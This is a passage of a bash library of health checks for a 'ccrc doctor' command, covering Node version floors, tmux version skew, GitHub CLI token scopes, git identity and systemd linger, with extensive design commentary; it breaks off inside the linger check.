#!/usr/bin/env bash
# ccrc-doctor-checks — the check TABLE `ccrc doctor` iterates, and each check's
# implementation. Stage 2b of the 2026-08-15-stage2b-ccrc-cli-and-doctor plan:
# the PREREQUISITE checks (Task 4), roster/wrapper coherence (Task 5, the
# `wrappers` entry) and the cross-box matched set (Task 7, `fleet`, the last
# entry in the table and the last function in this file).
#
# SOURCED, never executed — `ccrc`'s `cmd_doctor` does `. "$CCRC_HERE/ccrc-doctor-checks"`.
# It in turn sources `ccrc-wrapper-shape` (see below), so **DOCTOR's set is
# THREE files in one directory** — `ccrc`, this file, `ccrc-wrapper-shape` —
# not two. THE CLI'S SET IS FOUR: `ccrc-adopt` joins them, because `cmd_adopt`
# execs it (Task 8). Both counts are correct and they are counting different
# things; `ccrc`'s own header counts the CLI's four, and whatever installs the
# CLI must ship all four. The two paragraphs used to share one wording, which
# read as a contradiction.
# Split out of `ccrc` itself (plan, "Files") so a check is testable without the
# CLI's whole argument surface, and so the table stays visible as data rather
# than buried in a dispatch.
#
# ── THE CONTRACT EVERY CHECK KEEPS ────────────────────────────────────────
# `_check_<name>` prints a verdict line to STDOUT
#
#     PASS|WARN|FAIL <name>: <detail>
#
# and, when the verdict is not PASS, exactly one further line
#
#     "  remedy: <what to do about it>"
#
# and returns 0 (pass), 2 (warn) or 1 (fail). The remedy is not optional and
# not advisory: `_dr_fail`/`_dr_warn` print BOTH lines themselves, so a check
# physically cannot emit a non-pass verdict without one. A check that only
# complains sends an operator to a search engine; the remedy is the half that
# makes doctor an instrument instead of an alarm.
#
# ── THE FOURTH OUTCOME: A CHECK WITH NOTHING TO MEASURE ───────────────────
# A check whose SUBJECT does not exist on this box prints, instead,
#
#     SKIP <name>: <why there was nothing to measure>
#
# with no remedy, and returns 3 (`_dr_skip`). `fleet` is the case that forced
# it: it compares TWO boxes, and a box with no server to ask has no second box.
# PASS would claim an agreement nobody measured — the overloaded-null defect
# this codebase bans by name — and WARN would report a problem where there is
# none. `ccrc`'s `cmd_doctor` counts a skip against CHECKS and never against
# verdicts, and prints the count, so "N checks, M verdicts" says how much of
# the box was really measured.
#
# NO REMEDY UNDER A SKIP, deliberately: a `remedy:` line reads as "there is
# something here to fix", and on the fleet host — which has no `ccrc.env` and
# no reason to know where the server is — there is not. Where an operator COULD
# make the check answer, that goes in the detail, as a fact about what is
# missing rather than as an instruction.
#
# ── ONE CHECK MAY ANSWER IN TWO (OR MORE) CLASSES ─────────────────────────
# Almost every check prints exactly ONE verdict line. A check that has found
# findings of two different classes may print a FAIL line and then a WARN line
# — each with its own remedy — and returns the WORSE class (1). It is not a
# licence to be chatty; it is the rule that stops the overloaded seam this
# codebase bans by name. `_check_wrappers` is the case that forced it (Task 5
# review, Important 1): "your roster and this wrapper disagree, fix one of
# them" and "here is a launcher nobody wrote down, which may well be
# deliberate" are two findings an operator acts on DIFFERENTLY, and joining
# them into one FAIL sentence both laundered the second into a defect and
# discarded the remedy that belonged to it.
#
# TWO FAIL LINES from one check is the same rule, not an exception to it:
# `_check_wrappers` again (D-82, Task 1 of stage2d) — "nothing exists on disk
# for `ccrc wrappers` to refuse" and "the roster and the wrapper on disk
# disagree" are BOTH hard findings (both FAIL, both return 1), but they are
# still two DIFFERENT operator actions (`ccrc wrappers` vs hand-reconciling
# the roster), so they get two FAIL lines, each with its own remedy, rather
# than one bucket whose remedy is right for only one of the two sentences it
# joined. The worst-class rule does not change: two FAILs still return 1, the
# same as one would.
#
# THREE FAIL LINES from one check is the same rule again, still not an
# exception: `_check_wrappers` a third time (A2-NEW) — an absent upstream
# binary ("go install Claude Code") joins the other two FAIL classes above as
# a THIRD hard finding with a THIRD distinct operator action. `cmd_doctor`'s
# line-counting below is not a fixed arity: it scans a check's captured output
# line by line, counts every `FAIL <name>: `/`WARN <name>: ` it sees (however
# many there are), and cross-checks only whether ANY FAIL line was printed
# against the return code (worst = FAIL if the FAIL count is nonzero) — so a
# check answering in four classes at once (this one, on a box that is BOTH
# missing its upstream binary and disagreeing about a generated one) needs no
# change there. Adding a bucket costs the bucket's own `if`, not a change to
# what counts it.
#
# `ccrc`'s `cmd_doctor` counts VERDICT LINES, not return codes, so a check that
# answers in several classes is counted in all of them — and it cross-checks
# the loudest statement against the return code: a return code that is not the
# worst class the check printed is reported as a bug in ccrc.
#
# The verdict lines are the RESULT of the verb, so they go to stdout — NOT to
# stderr through `_ccrc_say`, which `ccrc`'s own header (Task 1) had guessed
# they would. The pairing "a FAIL line, then ITS remedy on the next line" is
# the machine-readable part of this contract (`server/test/ccrc-doctor.test.ts`
# asserts it per FAIL line), and splitting the pair across two streams would
# break it for anyone who redirects one of them — which is every caller that
# pipes doctor into a report. `_ccrc_say` keeps its job: stderr notes that are
# not a verdict.
#
# The printed <name> IS the function suffix (`_check_gh_auth` prints `gh_auth`),
# so a reader who sees a line can grep straight to the code that wrote it.
# That is why the names are underscored rather than hyphenated.
#
# ── WHY THE DETAIL IS ALWAYS A MEASUREMENT ────────────────────────────────
# Every PASS names what was actually found (the resolved path, the version, the
# address), never the bare word "ok". A check that prints "PASS tmux: ok" is
# indistinguishable from a check that was never wired up, and this project has
# already been bitten by exactly that shape (`single-definition.test.ts`'s "a
# scan over an empty list passes everything").
#
# ── set -e ────────────────────────────────────────────────────────────────
# This file is sourced into `ccrc`, which runs `set -uo pipefail` and NOT `-e`,
# deliberately — see that file's header. Checks SIGNAL by returning non-zero;
# under `-e` the first failing check would abort the run, which is precisely
# the run an operator needs to see whole. Nothing here may turn `-e` back on.

# Where the shipped tree is, relative to THIS file rather than to $PWD —
# `ccrc-adopt:139-140`'s idiom, in the same PATH-free spelling `ccrc` uses (see
# that file for why `dirname` is not called here: doctor has to work on a box
# whose PATH is the broken thing). `${BASH_SOURCE[0]}` and not `$0`, because
# this file is only ever reached by `source`, where `$0` is the CALLER's
# argv[0]. `:=` so the value `ccrc` already computed wins when there is one,
# and so this file still resolves itself when a test sources it on its own.
if [ -z "${CCRC_HERE:-}" ]; then
  CCRC_HERE="${BASH_SOURCE[0]}"
  [[ "$CCRC_HERE" == */* ]] || CCRC_HERE="./$CCRC_HERE"
  CCRC_HERE="$(cd "${CCRC_HERE%/*}" && pwd)"
fi

# ── the wrapper contract, sourced rather than restated ────────────────────
# `ccrc-wrapper-shape` is the THIRD file that ships beside `ccrc`, and it is
# load-bearing rather than incidental: it holds the shape of a generated
# account wrapper, which `ccrc-adopt` writes rosters FROM and `_check_wrappers`
# checks rosters AGAINST. A second copy of that shape is how the two would
# drift into agreeing with each other about a shape neither tool produces —
# which would make the check worse than useless.
#
# Sourced BEST-EFFORT, not with `||` refusal, on purpose: a missing library
# must not take the other ten checks down with it. `_check_wrappers` notices
# its absence itself and says so in a verdict line with a remedy — see the top
# of that function, and `ccrc-doctor.test.ts`'s "did not ship" case, which is
# the mechanism that keeps the install honest.
CCRC_WRAPPER_LIB="$CCRC_HERE/ccrc-wrapper-shape"
if [ -r "$CCRC_WRAPPER_LIB" ]; then
  # shellcheck source=ccrc-wrapper-shape
  . "$CCRC_WRAPPER_LIB"
fi

# How long `gh auth status` may take. Overridable for the same reason
# `deploy/verify-service.sh:56-62` makes its settle/window knobs overridable: so
# a test need not wait out a production timeout. The DEFAULT is what an operator
# gets. (The OTHER checks that touch the network, `build` and `fleet`, are
# bounded by `CCRC_HEALTH_TIMEOUT`, declared in `ccrc` beside the reader that
# uses it — `ccrc status` makes the same call and must be bounded by the same
# knob.)
: "${CCRC_DOCTOR_GH_TIMEOUT:=15}"

# How long `ccd docs-index --all` may take before the `docs` check calls it
# unanswered (spec 2026-10-01 §7.2). The DEFAULT equals the server's runner
# budget for the same verb (20 s), so doctor waits exactly as long as a Docs
# page would; Docs W2 adds that budget and the test that holds the two equal.
# Overridable for the gh knob's reason above.
: "${CCRC_DOCTOR_DOCS_TIMEOUT:=20}"

# ── the check table ───────────────────────────────────────────────────────
# DATA. `cmd_doctor` iterates this array and calls `_check_<name>` for each
# entry, so adding a check is one entry here, one function below, and one test
# — and `ccrc-doctor.test.ts`'s first case fails the build if the table and the
# functions ever disagree in either direction.
CCRC_DOCTOR_CHECKS=(
  node
  tmux
  tmux_skew
  git
  gh
  jq
  jq_regex
  python3
  flock timeout   # one line, as `models codex` below; _check_timeout is at the END of this file
  gh_auth
  git_email
  linger
  path
  services
  scopes scope-sweep   # one line, as `flock timeout`: _check_scope-sweep is at the END of this file
  config
  auth box-token   # one line, as `flock timeout`: _check_box-token is at the END of this file
  rc
  exposure
  update-exposure
  caddy
  caddyfile
  cert
  name
  disk
  wrappers
  skills
  accounts
  credentials
  pools
  pool-sync
  update-sync
  graphify
  graphify-path
  build
  provenance
  fleet
  memory
  routing model-default   # one line, as `flock timeout` above; _check_model-default is at the END of this file
  models codex docs history   # four entries on one line: every line below is cited by number elsewhere
)

# ── verdict helpers ───────────────────────────────────────────────────────
# Newlines are squashed out of both halves: the contract is "the line
# immediately after a non-PASS verdict is its remedy", and a detail carrying an
# embedded newline (a subprocess's multi-line stderr, say) would silently break
# that pairing for every reader.
_dr_line() { printf '%s %s: %s\n' "$1" "$2" "${3//$'\n'/ }"; }
_dr_pass() { _dr_line PASS "$1" "$2"; return 0; }
_dr_warn() { _dr_line WARN "$1" "$2"; printf '  remedy: %s\n' "${3//$'\n'/ }"; return 2; }
_dr_fail() { _dr_line FAIL "$1" "$2"; printf '  remedy: %s\n' "${3//$'\n'/ }"; return 1; }
# No remedy, by contract — see "THE FOURTH OUTCOME" in this file's header.
_dr_skip() { _dr_line SKIP "$1" "$2"; return 3; }

# Findings joined onto one verdict line with "; ". Built here rather than with
# `printf '%s; '` so the last one carries no trailing separator. SHARED between
# `_check_wrappers` and `_check_fleet` (it was `_dr_wr_join`, wrappers-owned,
# until the second caller arrived): a private second copy of four lines of
# string-joining is exactly the drift this file's own header objects to in the
# large, and there is nothing account-specific about it.
_dr_join() {
  local out="" x
  for x in "$@"; do [ -z "$out" ] || out+="; "; out+="$x"; done
  printf '%s' "$out"
}

# Leading/trailing whitespace off a captured value, in pure parameter
# expansion (no `sed`, no subshell — see `_dr_pkg_candidates` for why this file
# avoids PATH lookups it does not need). Two callers, and BOTH were defects the
# review found: a floor of `" >=22.13.0 "` was rejected by doctor while
# node-floor.test.ts:38-39 accepts it (it does `.exec(range.trim())` and this
# claimed to copy that rule EXACTLY), and a `user.email` of `"   "` was
# non-empty enough to PASS — printing `PASS git_email:    `, a line this
# suite's own shape test declares illegal, for a box whose commits carry an
# empty author address.
_dr_trim() {
  local s="$1"
  s="${s#"${s%%[![:space:]]*}"}"
  s="${s%"${s##*[![:space:]]}"}"
  printf '%s' "$s"
}

# First non-empty line of a captured output, for details that quote a tool's
# own diagnosis without pasting a screenful of it.
_dr_first_line() {
  local l
  while IFS= read -r l; do
    [ -n "$l" ] || continue
    printf '%s' "$l"
    return 0
  done <<< "$1"
  printf '%s' ""
}

# The one shape shared by the six "is this binary installed" checks.
_dr_need_bin() {
  local name="$1" why="$2" remedy="$3" p
  p="$(command -v "$name" 2>/dev/null)"
  if [ -z "$p" ]; then
    _dr_fail "$name" "not on PATH — $why" "$remedy"
    return 1
  fi
  _dr_pass "$name" "$p"
}

# ── node: the floor is READ, never re-typed ───────────────────────────────
# WHICH package.json IS CANONICAL DEPENDS ON THE BOX, and that is why this
# looks in two places rather than one:
#   - a fleet host has `~/ccrc/{agent,shared,deploy,ccd}` (deploy.sh's agent-arm rsync, `agent shared deploy ccd "$BOX":ccrc/`), so
#     the shipped declaration there is `~/ccrc/agent/package.json`;
#   - a server host has `~/ccrc/{server,shared,deploy,ccd}` (deploy.sh's server-arm rsync, `server shared deploy ccd "$BOX":ccrc/`), so
#     it is `~/ccrc/server/package.json`. `ccd` is in BOTH lanes as of Task 8 —
#     the server box gets the directory so `ccrc` and its three siblings have a
#     home there, and it installs nothing else out of it (no ccd binary, no
#     session hooks; those are the agent lane's). This paragraph said
#     `{server,shared,deploy}` until the whole-branch review caught it: the
#     LOGIC never depended on the difference (both candidates are tried, and
#     the right one exists on each box), but a comment that is wrong about
#     what ships is exactly how the next reader mis-predicts a deploy.
#   - `pwa/package.json` never ships at all and is deliberately not consulted.
# Either answer is the SAME answer: `server/test/node-floor.test.ts:45-50`
# asserts all three declarations are byte-identical and fails the build the
# moment they are not. That test is the reason this may take the first one it
# finds instead of cross-checking them.
#
# Resolved relative to THIS SCRIPT, not to $PWD, so doctor works on a bare
# installed box with no checkout anywhere near it — which is the entire point
# of doctor (plan, "Open questions": "`ccrc doctor` must not depend on a
# checkout").
_dr_pkg_candidates() {
  local root
  root="$(cd "$CCRC_HERE/.." 2>/dev/null && pwd)" || root="$CCRC_HERE/.."
  printf '%s\n' "$root/server/package.json" "$root/agent/package.json"
}

_check_node() {
  local p
  p="$(command -v node 2>/dev/null)"
  if [ -z "$p" ]; then
    _dr_fail node "not on PATH — the server, the agent and every deploy step run on it" \
      "install Node (nodesource or nvm), then re-run: ccrc doctor"
    return 1
  fi

  local pkg="" cand
  while IFS= read -r cand; do
    [ -f "$cand" ] && { pkg="$cand"; break; }
  done < <(_dr_pkg_candidates)
  if [ -z "$pkg" ]; then
    # Joined in bash rather than through `tr`: a check that needs a coreutils
    # binary to print its own failure message is a check that goes silent on
    # exactly the broken box it exists for.
    local looked
    looked="$(_dr_pkg_candidates)"
    _dr_fail node "no shipped package.json to read engines.node from — looked at ${looked//$'\n'/ and }" \
      "run ccrc from inside the shipped tree (~/ccrc/ccd/ccrc) or from a checkout; a lone copy of this script cannot know the floor"
    return 1
  fi

  # Parsed by node itself, not by jq: the node check must not fail for a reason
  # that belongs to another check (a box with no jq gets exactly one FAIL, from
  # the jq check), and node is by definition available here — its absence is
  # the branch above. The path travels in the environment rather than argv so
  # there is no argv[1]-vs-argv[2] ambiguity to get wrong.
  # READING the file and PARSING it are separated on purpose (Task 4 review,
  # Minor 6): `chmod 000` and "somebody wrote garbage here" are two conditions
  # an operator acts on completely differently — one is a mode/ownership fix,
  # the other a redeploy — and collapsing them into one signal is the
  # overloaded-seam mistake this codebase bans by name. It is the same defect
  # Task 1 fixed when a missing `jq` was being reported as a corrupt build
  # stamp. The read failure carries node's own errno out on stdout so the
  # verdict can name it.
  #   exit 5 = cannot be read (prints "READERR:<code>")
  #   exit 3 = does not parse; exit 4 = declares no engines.node.
  local range rc
  range="$(CCRC_DOCTOR_PKG="$pkg" node -e '
    const fs = require("fs");
    let text;
    try { text = fs.readFileSync(process.env.CCRC_DOCTOR_PKG, "utf8"); }
    catch (e) { process.stdout.write("READERR:" + (e && e.code ? e.code : "unknown")); process.exit(5); }
    let j;
    try { j = JSON.parse(text); }
    catch (e) { process.exit(3); }
    const r = j && j.engines && j.engines.node;
    if (typeof r !== "string" || r.length === 0) process.exit(4);
    process.stdout.write(r);
  ' 2>/dev/null)"; rc=$?
  if [ "$rc" -eq 5 ]; then
    local why="${range#READERR:}"
    [ -n "$why" ] && [ "$why" != "$range" ] || why="unreadable"
    _dr_fail node "$pkg exists but cannot be read ($why), so the floor cannot be read" \
      "fix its mode/ownership — check with: ls -l $pkg (a deploy leaves it world-readable)"
    return 1
  fi
  if [ "$rc" -eq 3 ]; then
    _dr_fail node "$pkg does not parse as JSON, so the floor cannot be read" \
      "restore or redeploy $pkg — something wrote garbage where a package manifest belongs"
    return 1
  fi
  if [ "$rc" -ne 0 ] || [ -z "$range" ]; then
    _dr_fail node "$pkg declares no engines.node, so this box has no floor to check against" \
      "declare it — engines.node is the single place the Node floor is written down (server/test/node-floor.test.ts)"
    return 1
  fi

  # EXACTLY node-floor.test.ts:38-42's rule, and for its stated reason: the
  # moment someone writes `^22 || >=24`, this must fail loudly rather than
  # silently accept a floor it did not understand. No version number is spelled
  # in this file — that is what reading the manifest is for.
  #
  # `_dr_trim` is part of that rule, not a nicety: node-floor matches against
  # `range.trim()`, so `" >=22.13.0 "` keeps all three declarations identical
  # and that suite green — a doctor that rejected it would be STRICTER than the
  # rule it claims to copy, and would fail a box whose manifests are fine. The
  # verdict below still quotes the value as written, so an otherwise invisible
  # stray space is still visible when the form really is wrong.
  local floor_re='^>=([0-9]+)\.([0-9]+)\.([0-9]+)$' declared
  declared="$(_dr_trim "$range")"
  if [[ ! "$declared" =~ $floor_re ]]; then
    _dr_fail node "unrecognised engines range \"$range\" in $pkg — this check understands only a single '>=x.y.z'" \
      "declare engines.node as one '>=x.y.z' range (node-floor.test.ts:38-42 pins the same rule), or teach ccrc-doctor-checks the new form deliberately"
    return 1
  fi
  local maj="${BASH_REMATCH[1]}" min="${BASH_REMATCH[2]}" pat="${BASH_REMATCH[3]}"

  local running ver_re='^v?([0-9]+)\.([0-9]+)\.([0-9]+)'
  running="$(node --version 2>/dev/null)"
  if [[ ! "$running" =~ $ver_re ]]; then
    _dr_fail node "'node --version' printed \"$running\", which is not a version" \
      "check what $p actually is — a wrapper script on PATH shadowing the real interpreter is the usual cause"
    return 1
  fi
  local rmaj="${BASH_REMATCH[1]}" rmin="${BASH_REMATCH[2]}" rpat="${BASH_REMATCH[3]}"

  if (( rmaj > maj || (rmaj == maj && (rmin > min || (rmin == min && rpat >= pat))) )); then
    _dr_pass node "$running satisfies $declared (declared in $pkg), at $p"
  else
    _dr_fail node "$running is below the floor $declared declared in $pkg" \
      "upgrade Node to at least ${maj}.${min}.${pat} — below it a Node without node:sqlite stops the server booting, and a node:sqlite without FTS5 leaves ccrc history capturing with no search index (fts5-absent, doctor history WARN fts-unavailable)"  # D-4296 (node-floor-remedy-history-fts)
    return 1
  fi
}

# ── the binaries a fleet box cannot work without ──────────────────────────
_check_tmux() {
  _dr_need_bin tmux "every ccd session lives in a tmux window, and that is how one is attached, read and driven" \
    "install it: sudo apt install tmux"
}

# ── tmux_skew: the loaded gun — a new client under the running server ─────
# `tmux -V` names the CLIENT: the binary on disk, the one every next attach
# and every `ccd` call runs. `display-message -p '#{version}'` asks the
# RUNNING SERVER for its own. Disagreement means an upgrade landed under a
# live server, and the moment a new client speaks to it the server refuses
# the whole conversation ("protocol version mismatch") — on a fleet host that
# severs the console from every session at once, while the sessions
# themselves keep running unattached (the substrate-unreachable spec §5 calls
# this the loaded gun, seen before it fires). A version FLOOR is deliberately
# NOT checked: the dangerous direction is client/server skew, which is
# instant and total, not slow drift below some minimum.
#
# WARN and not FAIL, because the gun is loaded and not fired: nothing is
# broken while no new client starts, and the remedy is a scheduled action
# ("at the next quiet moment"), not an emergency.
#
# The server probe is deadline-bounded by CCRC_DOCTOR_GH_TIMEOUT — the same
# knob that bounds this file's other could-hang probe (`gh_auth`), reused
# rather than cloned because both mean one thing: how long doctor may sit on
# a call that should answer instantly. A wedged server holding the socket
# without answering is precisely a box this check will be run on.
_check_tmux_skew() {
  # Absence is the `tmux` check's FAIL, one entry up — a second verdict here
  # would count the same finding twice, and with no client there is no
  # client/server pair to compare.
  if ! command -v tmux >/dev/null 2>&1; then
    _dr_skip tmux_skew "tmux is not on PATH (the tmux check FAILs on that), so there is no client/server pair to compare"
    return 3
  fi

  local vline client
  vline="$(tmux -V 2>/dev/null)"
  client="$(_dr_trim "${vline#tmux }")"
  if [ -z "$client" ]; then
    _dr_skip tmux_skew "'tmux -V' printed \"$vline\", which names no client version, so there is nothing to compare a server against"
    return 3
  fi

  local server rc
  server="$(_plat_timeout "$CCRC_DOCTOR_GH_TIMEOUT" tmux display-message -p '#{version}' 2>/dev/null)"; rc=$?
  if [ "$rc" -eq 124 ]; then
    # NOT the "no server" sentence below: a server that holds the socket
    # without answering and a socket nobody holds are two different facts
    # about the box, and collapsing them is the overloaded seam this file
    # bans by name. Still a skip — nothing was measured — but the detail
    # names which nothing.
    _dr_skip tmux_skew "a tmux server holds the socket but did not answer within ${CCRC_DOCTOR_GH_TIMEOUT}s, so its version could not be read"
    return 3
  fi
  server="$(_dr_trim "$server")"
  if [ "$rc" -ne 0 ] || [ -z "$server" ]; then
    _dr_skip tmux_skew "no tmux server is running, so there is nothing to skew against — the next client to start one will be this client"
    return 3
  fi

  if [ "$server" = "$client" ]; then
    _dr_pass tmux_skew "client $client, running server $server — versions agree"
    return 0
  fi
  _dr_warn tmux_skew "the client on disk is $client but the running server is $server" \
    "a tmux upgrade landed under the running server — restart the tmux server at the next quiet moment or the next new client will be refused"
}

_check_git() {
  _dr_need_bin git "ccd builds every workspace as a git worktree" \
    "install it: sudo apt install git"
}
_check_gh() {
  _dr_need_bin gh "PR state, review and merge all go through the GitHub CLI (ccd:700-720)" \
    "install it: see https://cli.github.com (Debian/Ubuntu: sudo apt install gh)"
}
_check_jq() {
  _dr_need_bin jq "ccrc and ccrc-adopt read this box's small JSON files with it (ccrc version, accounts.json)" \
    "install it: sudo apt install jq"
}

# ── jq_regex: the regex engine the session hook's merge deny runs on ──────
# The worker merge deny in `session-hook.sh` (landing-order wave 2) strips
# quoted text in ONE jq program written in Oniguruma regex, lookbehind among
# it. A jq built without Oniguruma errors there, the hook is left with no
# command to match, and the deny FAILS OPEN with nothing on any screen (the
# hook's own header: "a jq built without Oniguruma ... the deny FAILS OPEN").
# This check is how that becomes a FAIL line: it asks jq the one question the
# strip depends on, whether a lookbehind matches, and nothing else. PRESENCE is
# the `jq` check's: with no jq on PATH this one has nothing to measure. A
# server-role box hosts no sessions, so no session hook runs there.
_check_jq_regex() {
  local _srv_role="" out rc
  # `${BOX_ENV_FILE:-}` and `-f` before `-r`: `_check_memory`'s reasons.
  [ -f "${BOX_ENV_FILE:-}" ] && [ -r "${BOX_ENV_FILE:-}" ] && _srv_role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
  if [ "$_srv_role" = server ]; then
    _dr_skip jq_regex "this box records CCRC_ROLE=server, so it hosts no sessions and runs no session hook"
    return 3
  fi
  if ! command -v jq >/dev/null 2>&1; then
    _dr_skip jq_regex "jq is not on PATH, so there is no regex engine to measure — the 'jq' check above owns that"
    return 3
  fi
  out="$(jq -n '"a" | test("(?<!b)a")' 2>&1)"; rc=$?
  if [ "$rc" -eq 0 ] && [ "$out" = true ]; then
    _dr_pass jq_regex "$(command -v jq) matches a lookbehind, (?<!b)a: the session hook's merge deny can read a command"
    return 0
  fi
  _dr_fail jq_regex "jq cannot run the session hook's regex (a lookbehind answered '$(_dr_first_line "$out")', rc $rc), so its worker merge deny reads no command and FAILS OPEN" \
    "install a jq built with Oniguruma (Debian/Ubuntu: sudo apt install jq; macOS: brew install jq), then re-run ccrc doctor"
  return 1
}
_check_python3() {
  _dr_need_bin python3 "~/.local/bin/ccd is a standard-library python3 launcher in front of the bash body (D-3696), the graph engine's venv is built with it, and ccd's Docs helper needs python3 3.8 or newer" \
    "install it: sudo apt install python3"
}
_check_flock() {
  _dr_need_bin flock "ccd serialises registry writes with it, and refuses to run ws-restore without it (ccd:3282-3283)" \
    "install it: sudo apt install util-linux"
}

# ── gh's authentication ───────────────────────────────────────────────────
# DELIBERATE DIVERGENCE FROM ccd, do not "harmonise" the two: `ccd` never
# probes `gh auth status` — it classifies gh's own stderr instead (ccd:733-741,
# "`gh auth status` is NOT probed first: it is another network call on the
# unhappy path"), because ccd runs that path in a poll loop over every open PR.
# Doctor is the COLD path: it runs when a human asks "is this box fit to
# work?", once, and the whole point of it is to answer questions the hot path
# cannot afford to ask. Moving this call into ccd would put a network round
# trip back into that loop.
#
# `--show-token` is NEVER passed, and only the FIRST line of gh's output is
# ever quoted back: gh redacts the token itself (`Token: gho_****`), and this
# file must not be the thing that un-redacts it.
_check_gh_auth() {
  if ! command -v gh >/dev/null 2>&1; then
    _dr_fail gh_auth "gh is not on PATH, so this box's GitHub credentials cannot be checked" \
      "install gh first — see the 'gh' check above; then: gh auth login --scopes repo"
    return 1
  fi

  # `--hostname github.com`: this check's job is one host's credential, and
  # `gh auth status` with no host filter prints EVERY host this box is logged
  # into concatenated together. Task 1 of stage2d (D-82's neighbour) measured
  # the consequence — a second host's `Token scopes: 'repo'` satisfied the
  # `case` match below even when github.com's own section had no 'repo' at
  # all, which is a false PASS on exactly the credential the remedy already
  # names (`gh auth refresh -h github.com -s repo` is scoped to github.com;
  # the check that approved it should be too).
  local out rc
    out="$(_plat_timeout "$CCRC_DOCTOR_GH_TIMEOUT" gh auth status --hostname github.com 2>&1)"; rc=$?

  if [ "$rc" -eq 124 ]; then
    _dr_fail gh_auth "gh auth status did not answer within ${CCRC_DOCTOR_GH_TIMEOUT}s" \
      "check this box's network/proxy — an authenticated gh answers in well under a second"
    return 1
  fi
  if [ "$rc" -ne 0 ]; then
    _dr_fail gh_auth "gh auth status exited $rc: $(_dr_first_line "$out")" \
      "run: gh auth login --scopes repo (and re-run ccrc doctor)"
    return 1
  fi

  case "$out" in
    *"Token scopes:"*)
      # Matched WITH its quotes, exactly as gh prints a scope list, so
      # 'repo:status' — a read-only scope — cannot be mistaken for 'repo'.
      case "$out" in
        *"'repo'"*)
          _dr_pass gh_auth "authenticated, and the token carries the 'repo' scope" ;;
        *)
          _dr_fail gh_auth "authenticated, but the token has no 'repo' scope — this box could not open or merge a PR" \
            "run: gh auth refresh -h github.com -s repo"
          return 1 ;;
      esac
      ;;
    *)
      # A third state, and it must not collapse into either neighbour: PASS
      # would claim a fact nobody measured, FAIL would block a box that may be
      # entirely fine (a GH_TOKEN from the environment reports no scope list).
      _dr_warn gh_auth "authenticated, but gh printed no 'Token scopes:' line, so the 'repo' scope could not be verified" \
        "check by hand: gh auth status — a token from GH_TOKEN or a fine-grained token must still grant contents+pull-requests write"
      return 2 ;;
  esac
}

# ── git's identity ────────────────────────────────────────────────────────
# `--global`, then `--system` as a fallback: those two files ARE the box's
# identity, and nothing else counts. Deliberately NOT `git -C "$HOME" config
# user.email`, which is what this shipped first and which the review caught
# (Task 4 review, Important 1): that form reads system + global PLUS
# $HOME's own repo-local config, so the widespread dotfiles-in-$HOME pattern
# (`git init ~`) made the check PASS on a value that applies to exactly one
# repository — a false PASS on precisely the box this check exists to catch,
# and a verdict that contradicted its own FAIL text ("nothing in ~/.gitconfig
# or /etc/gitconfig"). Reproduced, then pinned by the dotfiles test in
# ccrc-doctor.test.ts.
#
# MEASURED on this project's own fleet box, and it is why the distinction
# matters rather than being pedantry: `~/.gitconfig` exists there and declares
# no user.email at all — every repository sets its own in `.git/config`. That
# box commits happily today and would refuse the FIRST commit in the next
# project ccd clones. FAIL, not WARN, for exactly that reason: the gap is
# invisible until it stops a worker mid-wave.
_check_git_email() {
  if ! command -v git >/dev/null 2>&1; then
    _dr_fail git_email "git is not on PATH, so this box's commit identity cannot be read" \
      "install git first — see the 'git' check above"
    return 1
  fi
  local email scope=--global
  email="$(_dr_trim "$(git config --global user.email 2>/dev/null)")"
  if [ -z "$email" ]; then
    scope=--system
    email="$(_dr_trim "$(git config --system user.email 2>/dev/null)")"
  fi
  if [ -n "$email" ]; then
    _dr_pass git_email "$email (git config $scope user.email)"
    return 0
  fi
  # ABSENT-BY-POLICY vs NEVER-CONFIGURED (D-893). Until this arm existed it read
  # `user.email` alone and called empty a failure, which collapsed two states an
  # operator handles completely differently — the overloaded-null-at-a-seam
  # shape this tree bans by name.
  #
  # `user.useConfigOnly` is git's own way to SAY "identity is per-repository":
  # with it set, git refuses to invent one from user@host and demands an
  # explicit `user.email` in each repo. That is a stronger posture than a global
  # default, not a weaker one, and on a box carrying several identities it is
  # the correct one — a global default silently attributes a commit to the wrong
  # address whenever a repo forgets its own, and a wrong author is permanent in
  # history where a refusal is loud and fixable.
  #
  # Measured on the fleet box that prompted this: three distinct identities in
  # use across twenty repositories, every one of them setting its own, and zero
  # missing. `ccd ws-add` uses `git worktree add` (not `clone`), so a new
  # workspace inherits its parent's identity — which is why the fleet never hit
  # this despite the check failing for months.
  local only
  only="$(_dr_trim "$(git config --global user.useConfigOnly 2>/dev/null)")"
  if [ "$only" = true ]; then
    _dr_pass git_email "per-repository by policy (git config --global user.useConfigOnly=true) — git refuses to invent an identity, so each repository states its own"
    return 0
  fi
  # Neither an identity nor a policy: this box has simply never been told.
  _dr_fail git_email "not set for this box, and no per-repository policy declared (nothing in ~/.gitconfig or /etc/gitconfig) — a commit in any repository that does not set its own would be refused" \
    "pick ONE: git config --global user.email \"you@example.com\" (and user.name alongside it), OR — if identity is deliberately per-repository — git config --global user.useConfigOnly true"
  return 1
}

# ── systemd linger ────────────────────────────────────────────────────────
# Net-new: nothing in this repository has ever checked linger — it is prose in
# the planning documents and nothing more. It belongs in doctor because every
# ccd session is a `systemctl --user` unit (`ccd/claude-session@.service`), and
# without linger /run/user/$UID is torn down when the last login session ends,
# taking the whole fleet with it. `ccd:93-95` defaults XDG_RUNTIME_DIR and
# DBUS_SESSION_BUS_ADDRESS so `systemctl --user` works from a non-interactive
# SSH context; this check runs in that same world and asks the question those
# defaults assume the answer to.
#
# Queried by $UID (a bash builtin variable — no `id` subprocess, and no NSS
# name lookup to fail) and remedied by UID too, so the remedy is a command an
# operator can paste verbatim.
_check_linger() {
  # macOS HAS NO LINGER, AND NO WAY TO GET ONE. `loginctl enable-linger` makes
  # a user's units run with nobody logged in; a LaunchAgent runs inside the
  # GUI login session and stops at logout. The only thing on this platform
  # that survives a logout is a LaunchDAEMON — root-owned, in
  # /Library/LaunchDaemons, running as a different user with a different
  # keychain — which is a posture nobody asked for and `ccrc install`
  # deliberately does not choose.
  #
  # SO THIS IS A WARN, NOT A FAIL, and the distinction is the whole point of
  # this arm: a FAIL says "fix this", and there is nothing to fix. The
  # operator's box is correctly installed and has one guarantee less than a
  # Linux fleet host does. The remedy names the two settings that come closest
  # to the missing guarantee rather than a command that does not exist.
  if [ "${CCD_OS:-linux}" = darwin ]; then
    _dr_warn linger "not a macOS concept — a LaunchAgent runs in your login session, so this box's server and its sessions stop at logout and start again at login. A Linux fleet host keeps them running with nobody logged in; this box cannot" \
